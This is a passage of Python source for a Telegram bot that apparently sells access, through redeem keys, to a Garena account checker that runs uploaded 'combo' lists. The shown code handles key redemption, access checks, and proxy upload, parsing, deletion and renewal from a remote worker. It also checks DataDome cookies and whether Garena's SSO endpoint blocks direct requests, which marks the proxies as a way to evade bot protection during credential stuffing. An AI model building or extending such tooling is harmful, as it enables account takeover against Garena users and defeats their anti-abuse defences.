            f"🔑 <b>Key:</b> <code>{key}</code>\n"
            f"🆔 <b>Your ID:</b> <code>{from_user.get('id', chat_id)}</code>\n"
            f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
            f"👥 <b>Slots:</b> {len(used_by)}/{slots_max}\n"
            f"📦 <b>Combo limit:</b> ∞ Unlimited\n\n"
            f"<i>Update your settings below 👇</i>"
        )
        _ask_level(token, chat_id)
        return

    # ── User limit check ───────────────────────────────────────
    if max_users != 0 and len(used_by) >= max_users:
        _tg_send(token, chat_id,
            f"🔒 <b>Key is full!</b>\n\n"
            f"This key already has <b>{len(used_by)}/{max_users}</b> users.\n"
            f"Ask the owner for a new key.")
        return

    # ── Add this user ──────────────────────────────────────────────────
    # Store rich user info: {id, name, username} instead of just chat_id
    user_name     = from_user.get("first_name", "")
    user_lastname = from_user.get("last_name", "")
    if user_lastname:
        user_name += f" {user_lastname}"
    user_username = from_user.get("username", "")
    user_tg_id    = from_user.get("id", chat_id)

    # Check if this user (by id) is already in used_by to avoid duplicates
    already_index = None
    for idx, u in enumerate(used_by):
        uid_check = u if isinstance(u, str) else str(u.get("id", ""))
        if uid_check == uid_str:
            already_index = idx
            break

    user_entry = {"id": uid_str, "name": user_name, "username": user_username, "tg_id": user_tg_id}
    if already_index is not None:
        used_by[already_index] = user_entry  # update with richer info
    else:
        used_by.append(user_entry)
    entry["used_by"] = used_by
    _save_keys(keys)

    d = _udata(chat_id)
    d["key"]         = key
    d["key_expires"] = entry["expires"]
    d["combo_limit"] = entry.get("combo_limit", 500)
    d["key_tier"]    = entry.get("tier", "free")
    _save_profile(chat_id, d)

    remaining  = int(entry["expires"] - now)
    hrs  = remaining // 3600
    mins = (remaining % 3600) // 60
    slots_used = len(used_by)
    slots_max  = "∞" if max_users == 0 else str(max_users)

    # ── Success message ────────────────────────────────────────
    # ── Success message ──────────────────────────────────────────────────
    _tg_send(token, chat_id,
        f"✅ <b>Key Redeemed Successfully!</b> {'⭐ VIP (no queue)' if entry.get('tier', 'free') == 'vip' else '🆓 Free (queued)'}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>Key:</b> <code>{key}</code>\n"
        f"🆔 <b>Your ID:</b> <code>{user_tg_id}</code>\n"
        f"👤 <b>Name:</b> {user_name or 'Unknown'}{' @' + user_username if user_username else ''}\n"
        f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
        f"👥 <b>Slots:</b> {slots_used}/{slots_max} used\n"
        f"📦 <b>Combo limit:</b> ∞ Unlimited\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<i>Now set up your preferences below 👇</i>"
    )

    # ── Notify the owner about the redemption ──────────────────────────
    try:
        owner_msg_name = user_name or "Unknown"
        owner_msg_user = f" @{user_username}" if user_username else ""
        owner_msg_id   = user_tg_id
        _tg_send(token, OWNER_ID,
            f"🔑 <b>Key Redeemed!</b>\n\n"
            f"👤 <b>User:</b> {owner_msg_name}{owner_msg_user}\n"
            f"🆔 <b>ID:</b> <code>{owner_msg_id}</code>\n"
            f"🔑 <b>Key:</b> <code>{key[:20]}{'…' if len(key) > 20 else ''}</code>\n"
            f"📊 <b>Slots:</b> {slots_used}/{slots_max} used"
        )
    except Exception:
        pass  # don't fail redeem if owner notification fails

    # ── Immediately show level picker ──────────────────────────
    _ask_level(token, chat_id)


def _check_access(token: str, chat_id, from_user: dict) -> bool:
    """Returns True if user is allowed to use the checker."""
    if _is_owner(from_user):
        return True

    # ── Maintenance mode: no proxies available ──────────────────
    if not _has_proxies():
        _notify_no_proxy(token, chat_id, from_user)
        # Check if user already has a paused session
        already_paused = False
        with _proxy_paused_lock:
            if str(chat_id) in _proxy_paused_users:
                already_paused = True
        if already_paused:
            _tg_send(token, chat_id,
                "⏳ <b>Still waiting for proxies...</b>\n\n"
                "Your check will auto-resume as soon as proxies are available.\n\n"
                "<i>Thank you for your patience.</i>"
            )
        else:
            _tg_send(token, chat_id,
                "🔧 <b>Bot Under Maintenance</b>\n\n"
                "No proxies available right now.\n"
                "Upload your combo file and your check will auto-resume when proxies are back!\n\n"
                "<i>Thank you for your patience.</i>"
            )
        return False

    uid_str = str(chat_id)
    d = _udata(chat_id)
    key         = d.get("key")
    key_expires = d.get("key_expires", 0)

    if key and time.time() < key_expires:
        return True

    # Also check saved profile on disk
    saved = _get_saved_profile(str(from_user.get("id", chat_id)))
    if saved:
        if saved.get("key") and time.time() < saved.get("key_expires", 0):
            # Restore into memory
            d["key"]         = saved["key"]
            d["key_expires"] = saved["key_expires"]
            d["combo_limit"] = saved.get("combo_limit", 500)
            d["key_tier"]    = saved.get("key_tier", "free")
            return True

    _tg_send(token, chat_id,
        "🔒 <b>Access Required</b>\n\n"
        "You need a valid redeem key to use this bot.\n\n"
        "Use <code>/redeem YOUR_KEY</code> to unlock.\n"
        "<i>Contact the owner to get a key.</i>"
    )
    return False


# ══════════════════════════════════════════════════════════════
#  PROXY UPLOAD via Telegram
# ══════════════════════════════════════════════════════════════
def _normalize_proxy_line(line: str) -> str | None:
    """
    Convert ANY proxy format into a valid http://user:pass@host:port URL.

    Handles ALL of these formats robustly:
      host:port
      host:port:user:pass          (port is 2nd part)
      user:pass@host:port
      http://host:port
      http://host:port:user:pass   ← owlproxy / rotating proxy style
      http://user:pass@host:port
      https://...  socks5://...
      ip:port:username:password
      username:password:ip:port

    The key fix: after stripping scheme, if we have 4 parts and BOTH parts[1]
    AND parts[3] are digits, we use the FIRST numeric as port (host:port:user:pass).
    """
    import re
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None

    # ── Step 1: strip scheme, keep original scheme for reconstruction ──
    scheme = "http"
    l = raw
    m = re.match(r"^(https?|socks5?h?)://(.*)$", l, re.IGNORECASE)
    if m:
        scheme = "http"   # normalise everything to http for proxy use
        l = m.group(2)

    # ── Step 2: handle user:pass@host:port (@ separator) ──────────────
    if "@" in l:
        creds, _, hostport = l.partition("@")
        # hostport may be host:port
        hp = hostport.rsplit(":", 1)
        if len(hp) == 2 and hp[1].isdigit():
            return f"http://{creds}@{hostport}"
        # hostport with no port — still usable as-is
        return f"http://{creds}@{hostport}" if hostport else None

    # ── Step 3: split by colon ─────────────────────────────────────────
    parts = l.split(":")

    if len(parts) == 2:
        # host:port
        host, port = parts[0].strip(), parts[1].strip()
        if port.isdigit():
            return f"http://{host}:{port}"
        return None

    if len(parts) == 3:
        # Could be host:port:junk — keep host:port if middle is a port number
        if parts[1].strip().isdigit():
            return f"http://{parts[0].strip()}:{parts[1].strip()}"
        # user:pass:host  (rare, no port — skip)
        return None

    if len(parts) == 4:
        a, b, c, d = [p.strip() for p in parts]

        # ── PRIORITY: host:port:user:pass  (b is port AND b < d numerically) ──
        # This covers:  change5.owlproxy.com:7778:e9wz239QA360_..._time_5:2484124
        # b = "7778" (port),  d = "2484124" (password)
        if b.isdigit():
            return f"http://{c}:{d}@{a}:{b}"

        # ── Fallback: user:pass:host:port  (d is port, b is NOT a port) ──
        if d.isdigit():
            return f"http://{a}:{b}@{c}:{d}"

        return None

    if len(parts) == 5:
        # scheme was already stripped; could be host:port:user:pass:extra — try first 4
        a, b, c, d, *_ = [p.strip() for p in parts]
        if b.isdigit():
            return f"http://{c}:{d}@{a}:{b}"
        if d.isdigit():
            return f"http://{a}:{b}@{c}:{d}"
        return None

    # More than 5 parts — try last two as user:pass and search for port
    # e.g. custom rotating proxies with long usernames containing colons
    # Strategy: find first numeric part that looks like a port (< 65536)
    for i, p in enumerate(parts):
        if p.strip().isdigit() and int(p.strip()) < 65536 and i > 0:
            host    = ":".join(parts[:i])
            port    = p.strip()
            rest    = parts[i+1:]
            if len(rest) >= 2:
                user = rest[0].strip()
                pwd  = ":".join(r.strip() for r in rest[1:])
                return f"http://{user}:{pwd}@{host}:{port}"
            return f"http://{host}:{port}"

    return None


def _preprocess_proxy_text(raw_text: str) -> list:
    """
    Telegram wraps long proxy lines into multiple display lines when pasted.
    Example — one proxy becomes:

        http://change5.owlproxy.com:7778:e9wz239QA360_custom_zone_PH_st__city_sid_47320445_t
        ime_5:2484124

    The tricky part: each fragment can LOOK like a valid proxy on its own
    (frag1 = http://host:port:partial_user → parses as host:port,
     frag2 = ime_5:2484124 → parses as user:pass).

    REAL FIX: a line that starts with http:// and contains a scheme MUST have
    the username portion (3rd colon-field) that is a non-trivial string.
    We detect "probably a fragment continuation" by checking:
      • frag2 has no scheme AND no dot in the first segment AND is not a
        standalone ip:port — meaning it's a raw continuation word like "ime_5:2484124"

    Algorithm: buffer a line that ends with a truncated username (i.e. has
    http://host:port: prefix with NO closing :password yet), then join the
    next line to it.
    """
    import re

    SCHEME_RE  = re.compile(r"^https?://", re.IGNORECASE)
    # Matches lines like "http://host:port:partial_username" — has scheme,
    # has exactly ONE numeric port segment, then a non-empty username start,
    # but the username does NOT have a trailing :password (no 4th colon-field)
    TRUNCATED_RE = re.compile(
        r"^https?://[^:]+:\d{2,5}:[^:]+$",   # scheme://host:port:user  (no :pass yet)
        re.IGNORECASE
    )
    # A line is a "continuation fragment" if it has no scheme, no dot in the
    # leading segment (so not a hostname), and looks like  word:digits
    FRAGMENT_RE = re.compile(r"^[A-Za-z0-9_]+:\d+$")

    def _is_truncated_owlstyle(s: str) -> bool:
        """True if line is http://host:port:user with no :password — a cut proxy."""
        return bool(TRUNCATED_RE.match(s))

    def _is_continuation_fragment(s: str) -> bool:
        """True if line is a word fragment like 'ime_5:2484124'."""
        if SCHEME_RE.match(s):
            return False
        # No dot in first segment → not a hostname → fragment
        first = s.split(":")[0]
        if "." not in first and not re.match(r"^\d+$", first):
            return True
        return False

    lines  = raw_text.splitlines()
    result = []
    buffer = ""

    for raw in lines:
        stripped = raw.strip()

        if not stripped:
            if buffer:
                result.append(buffer)
                buffer = ""
            continue

        if stripped.startswith("#"):
            if buffer:
                result.append(buffer)
                buffer = ""
            result.append(stripped)
            continue

        if not buffer:
            # Check if this line is a truncated owlproxy-style line
            if _is_truncated_owlstyle(stripped):
                buffer = stripped   # buffer it — next line is the :password
            else:
                result.append(stripped)
        else:
            # We have a buffered truncated line — append this fragment
            candidate = buffer + stripped
            buffer = ""
            result.append(candidate)

    if buffer:
        result.append(buffer)

    # Second pass: also rejoin any remaining fragment pairs we may have missed
    # (handles 3-line wraps or other edge cases)
    final = []
    i = 0
    while i < len(result):
        line = result[i]
        # If next line exists and looks like a bare continuation fragment,
        # join it to this line
        if (i + 1 < len(result)
                and _is_continuation_fragment(result[i + 1])
                and not _normalize_proxy_line(result[i + 1]).__class__.__name__ == "NoneType"  # noqa
                and _normalize_proxy_line(line + result[i + 1]) is not None
                and _normalize_proxy_line(result[i + 1]) is None):
            # The fragment alone doesn't parse but joined it does
            final.append(line + result[i + 1])
            i += 2
        else:
            final.append(line)
            i += 1

    return [r for r in final if r.strip()]


def _save_proxies_from_lines(raw_lines: list) -> tuple:
    """
    Parse and normalize proxy lines, save to proxy/pasted_proxies.txt,
    reload geo_rotator. Returns (valid_count, skipped, save_path).
    """
    os.makedirs(PROXY_FOLDER, exist_ok=True)

    # Re-join any Telegram-wrapped lines before parsing
    joined_text = "\n".join(raw_lines)
    processed   = _preprocess_proxy_text(joined_text)

    normalized = []
    skipped    = 0

    for line in processed:
        result = _normalize_proxy_line(line)
        if result:
            normalized.append(result)
        elif line.strip() and not line.strip().startswith("#"):
            skipped += 1

    # Deduplicate
    seen  = set()
    dedup = []
    for p in normalized:
        if p not in seen:
            seen.add(p)
            dedup.append(p)

    save_path = os.path.join(PROXY_FOLDER, "pasted_proxies.txt")

    # Append to existing file if present, else create new
    existing = set()
    if os.path.exists(save_path):
        with open(save_path, "r", encoding="utf-8", errors="ignore") as f:
            existing = {l.strip() for l in f if l.strip() and not l.startswith("#")}

    new_proxies = [p for p in dedup if p not in existing]

    with open(save_path, "a", encoding="utf-8") as f:
        for p in new_proxies:
            f.write(p + "\n")

    try:
        geo_rotator._load_all_files()
    except Exception:
        pass

    # ── Persist to saved_proxies/ + KeyVault API ──
    try:
        _persist_proxies()
    except Exception:
        pass

    return len(new_proxies), skipped, save_path


def _unique_proxy_path(folder: str, file_name: str) -> str:
    """Return a unique path inside folder — auto-renames if file already exists.
    e.g. proxies.txt → proxies_1.txt → proxies_2.txt
    """
    base, ext = os.path.splitext(file_name)
    candidate = os.path.join(folder, file_name)
    counter   = 1
    while os.path.exists(candidate):
        candidate = os.path.join(folder, f"{base}_{counter}{ext}")
        counter  += 1
    return candidate


def _flush_proxy_accumulator(token: str, chat_id):
    """Save all accumulated proxy lines, delete all pasted messages, report results."""
    lines   = _proxy_accumulator.pop(chat_id, [])
    msg_ids = _proxy_msg_ids.pop(chat_id, [])

    # ── Delete every pasted message + bot reply from chat ─────
    if msg_ids:
        _tg_delete_messages_bulk(token, chat_id, msg_ids)

    if not lines:
        _tg_send(token, chat_id,
            "⚠️ <b>No proxy lines accumulated.</b>\n"
            "Paste some proxies first, then tap Done.")
        return

    valid_count, skipped, save_path = _save_proxies_from_lines(lines)
    total_now = geo_rotator.total

    _tg_send(token, chat_id,
        f"✅ <b>Proxies Saved!</b>\n\n"
        f"✏️ <b>Source:</b> Pasted text (multi-message)\n"
        f"✅ <b>New proxies added:</b> <code>{valid_count}</code>\n"
        f"❌ <b>Skipped (invalid):</b> <code>{skipped}</code>\n\n"
        f"📡 <b>Proxy pool now:</b> <code>{total_now}</code> total\n"
        f"💾 <b>Saved to:</b> <code>proxy/pasted_proxies.txt</code>"
    )
    _bot_state.pop(chat_id, None)


def _handle_proxy_upload(token: str, chat_id, from_user: dict, message: dict):
    """
    Handle proxy upload — supports:
      1. .txt file attachment  (processed immediately)
      2. Pasted proxy lines as text — can span MULTIPLE messages.
         Owner pastes batches across several messages; bot accumulates them
         all. When done, owner sends /done (or taps the Done button) and
         the bot saves + reloads the full pool.
    """
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    document = message.get("document")
    text     = message.get("text", "").strip()

    # ── /done or /proxy_done — finish accumulation and save ───
    if text.lower() in ("/done", "done", "/proxy_done"):
        _flush_proxy_accumulator(token, chat_id)
        return

    # ── No content yet — show instructions with buttons ───────
    if not document and not text and not message.get("caption"):
        # Clear any existing accumulator for a fresh session
        _proxy_accumulator.pop(chat_id, None)
        _tg_send_buttons(token, chat_id,
            "📡 <b>Upload Proxy</b>\n\n"
            "Choose how to add proxies:\n\n"
            "📎 <b>Send a .txt file</b> — processed immediately\n\n"
            "✏️ <b>Paste proxy lines</b> — send as many messages as you want,\n"
            "   then tap <b>✅ Done</b> when finished\n\n"
            "<b>Supported formats:</b>\n"
            "<code>host:port</code>\n"
            "<code>host:port:user:pass</code>\n"
            "<code>http://host:port:user:pass</code>\n"
            "<code>user:pass@host:port</code>\n\n"
            "<i>Long lines that Telegram wraps are auto-rejoined.</i>",
            [
                [
                    {"text": "✅ Done (save all)",  "callback_data": "proxy:done"},
                    {"text": "🗑 Clear & Cancel",   "callback_data": "proxy:cancel"},
                ],
            ]
        )
        return

    # ── Text input — accumulate across messages ────────────────
    if text and not document:
        raw_lines = text.splitlines()

        # Single-line command triggers — show instructions
        if len(raw_lines) == 1 and raw_lines[0].startswith("/") and raw_lines[0].lower() not in ("/done",):
            _tg_send_buttons(token, chat_id,
                "📡 <b>Upload Proxy</b>\n\n"
                "Paste your proxy lines (one or many messages).\n"
                "Tap <b>✅ Done</b> when you've sent all proxies.\n\n"
                "<b>Formats:</b> host:port · host:port:user:pass · http://host:port:user:pass",
                [
                    [
                        {"text": "✅ Done (save all)", "callback_data": "proxy:done"},
                        {"text": "🗑 Clear & Cancel",  "callback_data": "proxy:cancel"},
                    ],
                ]
            )
            return

        # Track the user's own message ID for deletion later
        user_msg_id = message.get("message_id")
        if user_msg_id:
            _proxy_msg_ids.setdefault(chat_id, []).append(user_msg_id)

        # Accumulate lines
        if chat_id not in _proxy_accumulator:
            _proxy_accumulator[chat_id] = []
        _proxy_accumulator[chat_id].extend(raw_lines)
        count_so_far = len(_proxy_accumulator[chat_id])

        # Send the "batch received" status and track its message ID too
        bot_reply = _tg_send_buttons(token, chat_id,
            f"📥 <b>Batch received!</b> Lines so far: <code>{count_so_far}</code>\n"
            f"<i>Keep sending more, or tap Done to save.</i>",
            [
                [
                    {"text": "✅ Done (save all)", "callback_data": "proxy:done"},
                    {"text": "🗑 Clear & Cancel",  "callback_data": "proxy:cancel"},
                ],
            ]
        )
        # Track the bot's own reply message ID
        if bot_reply and bot_reply.get("ok"):
            bot_msg_id = bot_reply["result"]["message_id"]
            _proxy_msg_ids.setdefault(chat_id, []).append(bot_msg_id)
        return

    # ── File attachment ─────────────────────────────────────────
    if not document:
        _tg_send(token, chat_id,
            "⚠️ Please send a <code>.txt</code> file or paste proxy lines as text.")
        return

    file_name = document.get("file_name", "proxies.txt")
    if not file_name.lower().endswith(".txt"):
        _tg_send(token, chat_id, "❌ Only <code>.txt</code> files accepted.")
        return

    dl_url = _tg_get_file_url(token, document.get("file_id"))
    if not dl_url:
        _tg_send(token, chat_id, "❌ Could not get download link. Try again.")
        return

    os.makedirs(PROXY_FOLDER, exist_ok=True)
    save_path   = _unique_proxy_path(PROXY_FOLDER, file_name)
    saved_name  = os.path.basename(save_path)
    was_renamed = saved_name != file_name
    try:
        r = requests.get(dl_url, timeout=30)
        r.raise_for_status()
        with open(save_path, "wb") as f:
            f.write(r.content)
    except Exception as e:
        _tg_send(token, chat_id, f"❌ Download failed: {e}")
        return

    try:
        with open(save_path, "r", encoding="utf-8", errors="ignore") as f:
            raw_text = f.read()
    except Exception:
        raw_text = ""

    processed   = _preprocess_proxy_text(raw_text)
    valid_count = 0
    skipped     = 0
    normalized  = []
    for line in processed:
        result = _normalize_proxy_line(line)
        if result:
            normalized.append(result)
            valid_count += 1
        elif line.strip() and not line.strip().startswith("#"):
            skipped += 1

    if normalized:
        with open(save_path, "w", encoding="utf-8") as f:
            for p in normalized:
                f.write(p + "\n")
    else:
        try:
            os.remove(save_path)
        except Exception:
            pass
        _tg_send(token, chat_id,
            "❌ <b>No valid proxy lines found in file.</b>\n\n"
            "Make sure the file contains proxies in a supported format.")
        return

    try:
        geo_rotator._load_all_files()
        total_now = geo_rotator.total
        # Clear any stale "no proxy" warning now that pool is loaded
        if total_now > 0:
            _clear_no_proxy_warning()
    except Exception:
        total_now = valid_count

    # ── Persist to saved_proxies/ + KeyVault API ──
    try:
        _persist_proxies()
    except Exception:
        pass

    rename_note = (
        f"\n📝 <b>Renamed:</b> <code>{file_name}</code> → <code>{saved_name}</code>"
        if was_renamed else ""
    )
    proxy_files_list = "\n".join(
        f"  📄 {os.path.basename(p)}"
        for p in _get_proxy_files()
    ) or "  <i>none</i>"

    _tg_send(token, chat_id,
        f"✅ <b>Proxy File Uploaded!</b>\n\n"
        f"📄 <b>File:</b>    <code>{saved_name}</code>{rename_note}\n"
        f"✅ <b>Valid:</b>   <code>{valid_count}</code> proxies\n"
        f"❌ <b>Skipped:</b> <code>{skipped}</code>\n\n"
        f"📡 <b>Proxy pool now:</b> <code>{total_now}</code> total\n\n"
        f"<b>All proxy files:</b>\n{proxy_files_list}"
    )


def _handle_proxy_status(token: str, chat_id, from_user: dict):
    """Show current proxy pool status, HTTP/SOCKS5 breakdown, DataDome, connectivity, and auto-fetch info."""
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    files = _get_proxy_files()
    pool_size = geo_rotator.total
    
    # ── Proxy file listing ──
    if not files:
        file_info = "<i>No proxy files found in proxy/ folder.</i>\n\n"
        file_info += "Use <code>/upload_proxy</code> to upload one.\n"
        file_info += f"Free proxies are auto-fetched every {RAW_PROXY_FETCH_INTERVAL}s."
    else:
        lines_out = []
        total = 0
        for fpath in files:
            fname = os.path.basename(fpath)
            try:
                size_kb = os.path.getsize(fpath) / 1024
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    count = sum(1 for l in f if l.strip() and not l.startswith("#") and ":" in l)
            except Exception:
                count, size_kb = 0, 0
            total += count
            lines_out.append(f"  📄 {fname}\n  📊 {count:,} proxies · {size_kb:.1f}KB")
        body = "\n\n".join(lines_out)
        file_info = f"{body}\n\n🔢 <b>Total: {total:,} in {len(files)} file(s)</b>"
    
    # ── DataDome status ──
    dd_status = "❌ No cookie"
    dd = None
    # Try to get DD from any active checker's datadome_manager
    for cid, bar_data in _active_bars.items():
        ls = bar_data.get("live_stats")
        if ls and hasattr(ls, '_datadome_manager') and ls._datadome_manager:
            dd = ls._datadome_manager.get_datadome()
            break
    if dd:
        dd_status = f"✅ <code>{dd[:30]}...</code>"
    
    # ── Quick connectivity check ──
    conn_status = "⏳ Checking..."
    try:
        resp = requests.get(
            "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
            timeout=8, allow_redirects=False
        )
        if resp.status_code == 200:
            conn_status = "✅ Direct OK (no block)"
        elif resp.status_code == 403:
            conn_status = "🛡️ DataDome blocked (need proxies!)"
        else:
            conn_status = f"⚠️ HTTP {resp.status_code}"
    except Exception:
        conn_status = "❌ Cannot reach Garena"
    
    # ── SOCKS5 count ──
    socks_count = sum(1 for p in geo_rotator._proxies if p.lower().startswith(("socks5", "socks4", "socks5h")))
    http_count = pool_size - socks_count
    
    _tg_send(token, chat_id,
        f"📡 <b>Proxy Status</b>\n\n"
        f"{file_info}\n\n"
        f"🏊 <b>Pool:</b> {pool_size:,} proxies\n"
        f"🔄 Auto-fetch: every {RAW_PROXY_FETCH_INTERVAL}s from {len(RAW_PROXY_SOURCES)} source(s)\n"
        f"  🌐 HTTP: {http_count:,} · 🔒 SOCKS5: {socks_count:,}\n\n"
        f"🍪 <b>DataDome:</b> {dd_status}\n\n"
        f"🔗 <b>Garena SSO:</b> {conn_status}"
    )


def _handle_delete_proxy(token: str, chat_id, from_user: dict):
    """Delete the raw_fetched_proxies.txt file and clear the proxy pool.
    Owner-only command — removes all auto-fetched proxies so they can be refreshed cleanly.
    Also re-enables the background auto-fetcher (worker-only mode OFF)."""
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    global _worker_only_mode
    with _worker_only_lock:
        was_worker_only = _worker_only_mode
        _worker_only_mode = False

    log = logging.getLogger(__name__)
    log.info(f"[DELETE-PROXY] Worker-only mode was {was_worker_only}, now disabled — auto-fetch will resume")
    deleted_files = []
    deleted_count = 0

    # Delete raw_fetched_proxies.txt
    if os.path.exists(RAW_PROXY_SAVE_FILE):
        try:
            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            deleted_count = len(lines)
            os.remove(RAW_PROXY_SAVE_FILE)
            deleted_files.append(f"raw_fetched_proxies.txt ({deleted_count} proxies)")
            log.info(f"[DELETE-PROXY] Deleted {RAW_PROXY_SAVE_FILE} ({deleted_count} proxies)")
        except Exception as e:
            log.error(f"[DELETE-PROXY] Failed to delete {RAW_PROXY_SAVE_FILE}: {e}")
            _tg_send(token, chat_id, f"❌ <b>Failed to delete proxy file:</b> <code>{e}</code>")
            return
    else:
        deleted_files.append("raw_fetched_proxies.txt (not found — already deleted)")

    # Also delete pasted_proxies.txt if it exists
    pasted_path = os.path.join(PROXY_FOLDER, "pasted_proxies.txt")
    if os.path.exists(pasted_path):
        try:
            with open(pasted_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            pasted_count = len(lines)
            os.remove(pasted_path)
            deleted_files.append(f"pasted_proxies.txt ({pasted_count} proxies)")
            deleted_count += pasted_count
            log.info(f"[DELETE-PROXY] Deleted {pasted_path} ({pasted_count} proxies)")
        except Exception as e:
            log.error(f"[DELETE-PROXY] Failed to delete {pasted_path}: {e}")

    # Clear the in-memory proxy pool and reload (will be empty now)
    try:
        with geo_rotator._lock:
            geo_rotator._proxies = []
            geo_rotator._proxy_source = {}
            geo_rotator._thread_idx = {}
            geo_rotator._thread_proxy = {}
            geo_rotator._global_idx = 0
        geo_rotator._load_all_files()
    except Exception as e:
        log.error(f"[DELETE-PROXY] Failed to clear pool: {e}")

    # Also clean saved_proxies/ mirror
    try:
        for fname in ["raw_fetched_proxies.txt", "pasted_proxies.txt"]:
            sp = os.path.join(SAVED_PROXIES_DIR, fname)
            if os.path.exists(sp):
                os.remove(sp)
    except Exception:
        pass

    pool_now = geo_rotator.total
    files_str = "\n".join(f"  🗑️ {f}" for f in deleted_files)

    _tg_send(token, chat_id,
        f"🗑️ <b>Proxy Files Deleted!</b>\n\n"
        f"{files_str}\n\n"
        f"🧹 <b>Total proxies removed:</b> <code>{deleted_count}</code>\n"
        f"📡 <b>Proxy pool now:</b> <code>{pool_now}</code>\n\n"
        f"💡 Use <code>/renewproxy</code> to fetch fresh proxies from the worker."
    )


def _handle_renew_proxy(token: str, chat_id, from_user: dict):
    """Fetch fresh proxies from https://worker-production-a615.up.railway.app/ only.
    DELETES the old raw_fetched_proxies.txt first (clean wipe), then fetches new
    proxies from the primary worker source and reloads the pool.
    Also enables worker-only mode so the background fetcher doesn't overwrite."""
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    global _worker_only_mode
    log = logging.getLogger(__name__)

    _tg_send(token, chat_id, "🔄 <b>Renewing proxies from worker…</b>\n\n"
        "⏳ Fetching fresh proxies from:\n"
        "<code>https://worker-production-a615.up.railway.app/</code>\n\n"
        "🗑️ Wiping old proxy files first…")

    # Step 1: DELETE old raw_fetched_proxies.txt completely
    old_count = 0
    if os.path.exists(RAW_PROXY_SAVE_FILE):
        try:
            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                old_count = sum(1 for l in f if l.strip() and not l.strip().startswith("#"))
            os.remove(RAW_PROXY_SAVE_FILE)
            log.info(f"[RENEW-PROXY] Deleted old {RAW_PROXY_SAVE_FILE} ({old_count} proxies)")
        except Exception as e:
            log.error(f"[RENEW-PROXY] Failed to delete old file: {e}")

    # Step 2: Also delete pasted_proxies.txt
    pasted_path = os.path.join(PROXY_FOLDER, "pasted_proxies.txt")
    if os.path.exists(pasted_path):
        try:
            os.remove(pasted_path)
            log.info(f"[RENEW-PROXY] Deleted old {pasted_path}")
        except Exception as e:
            log.error(f"[RENEW-PROXY] Failed to delete {pasted_path}: {e}")

    # Step 3: Delete ALL other proxy .txt files in proxy/ folder
    # This ensures no stale proxies remain from any source
    try:
        if os.path.exists(PROXY_FOLDER):
            for fname in os.listdir(PROXY_FOLDER):
                if fname.endswith(".txt"):
                    fpath = os.path.join(PROXY_FOLDER, fname)
                    try:
                        os.remove(fpath)
                        log.info(f"[RENEW-PROXY] Deleted {fpath}")
                    except Exception as e:
                        log.error(f"[RENEW-PROXY] Failed to delete {fpath}: {e}")
    except Exception as e:
        log.error(f"[RENEW-PROXY] Failed to scan proxy folder: {e}")

    # Step 4: Clear in-memory pool so old proxies don't persist
    try:
        with geo_rotator._lock:
            geo_rotator._proxies = []
            geo_rotator._proxy_source = {}
            geo_rotator._thread_idx = {}
            geo_rotator._thread_proxy = {}
            geo_rotator._global_idx = 0
    except Exception as e:
        log.error(f"[RENEW-PROXY] Failed to clear in-memory pool: {e}")

    # Also clean saved_proxies/ mirror
    try:
        if os.path.exists(SAVED_PROXIES_DIR):
            for fname in os.listdir(SAVED_PROXIES_DIR):
                if fname.endswith(".txt"):
                    sp = os.path.join(SAVED_PROXIES_DIR, fname)
                    try:
                        os.remove(sp)
                    except Exception:
                        pass
    except Exception:
        pass

    # Step 5: Fetch fresh proxies from the primary worker source ONLY
    worker_url = "https://worker-production-a615.up.railway.app/"
    new_proxies = []
    fetch_errors = []

    try:
        resp = requests.get(worker_url, timeout=30)
        resp.raise_for_status()
        raw_lines = [l.strip() for l in resp.text.splitlines()
                     if l.strip() and not l.strip().startswith("#")]
        log.info(f"[RENEW-PROXY] Fetched {len(raw_lines)} raw lines from worker")
    except Exception as e:
        raw_lines = []
        fetch_errors.append(f"Worker fetch failed: {e}")
        log.error(f"[RENEW-PROXY] Failed to fetch from worker: {e}")

    # Step 6: Normalize, deduplicate, write to fresh file
    if raw_lines:
        os.makedirs(PROXY_FOLDER, exist_ok=True)

        # Create FRESH raw_fetched_proxies.txt (not append!)
        with open(RAW_PROXY_SAVE_FILE, "w", encoding="utf-8") as f:
            f.write("# Auto-fetched proxies — renewed from worker\n")

        seen = set()
        for line in raw_lines:
            try:
                # Use GeoRotator's normalizer for consistent formatting
                normalized = geo_rotator._normalize_proxy(line)
                if not normalized:
                    continue
                if normalized in seen:
                    continue
                seen.add(normalized)
                new_proxies.append(normalized)
            except Exception:
                continue

        # Write all new proxies
        if new_proxies:
            with open(RAW_PROXY_SAVE_FILE, "a", encoding="utf-8") as f:
                for p in new_proxies:
                    f.write(p + "\n")

    # Step 7: Enable worker-only mode so background fetcher doesn't overwrite
    with _worker_only_lock:
        _worker_only_mode = True
    log.info("[RENEW-PROXY] Worker-only mode ENABLED — background auto-fetch paused")

    # Step 8: Reload the pool from disk (only the new file exists now)
    try:
        geo_rotator._load_all_files()
    except Exception as e:
        log.error(f"[RENEW-PROXY] Failed to reload pool: {e}")

    # Step 9: Persist
    try:
        _persist_proxies()
    except Exception:
        pass

    pool_now = geo_rotator.total

    # Build result message
    if fetch_errors:
        err_str = "\n".join(f"  ❌ {e}" for e in fetch_errors)
        _tg_send(token, chat_id,
            f"⚠️ <b>Proxy Renewal — Partial Failure</b>\n\n"
            f"🗑️ Old proxies deleted: <code>{old_count}</code>\n"
            f"✅ New proxies fetched: <code>{len(new_proxies)}</code>\n"
